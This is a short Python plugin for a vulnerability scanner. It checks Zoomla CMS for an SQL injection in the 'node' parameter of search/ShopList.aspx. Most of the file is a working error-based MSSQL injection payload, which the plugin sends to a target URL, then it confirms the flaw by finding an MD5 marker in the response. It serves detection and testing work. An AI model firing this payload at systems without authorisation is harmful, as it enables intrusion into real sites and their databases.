#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = zoomla search shoplist sql injection
#_Function_ = 插件格式
#_FileName_ = Plugin_Format.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-075845
#___Flag___ = 438b1eb36b7e244b
def assign(service, arg):
	if service == 'zoomla':
		return True, arg

def audit(arg):
	payload = "search/ShopList.aspx?node=1%20and%021=convert(int,(select%02sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27hentai%27))))&keyword=1"
	target = arg + payload
	code, head, body, errcode, final_url = curl.curl('%s' % target);
	if '438b1eb36b7e244b' in body:
		security_hole(target);

if __name__ == '__main__':
	from dummy import *
	audit(assign('zoomla', 'http://192.168.0.102/')[1])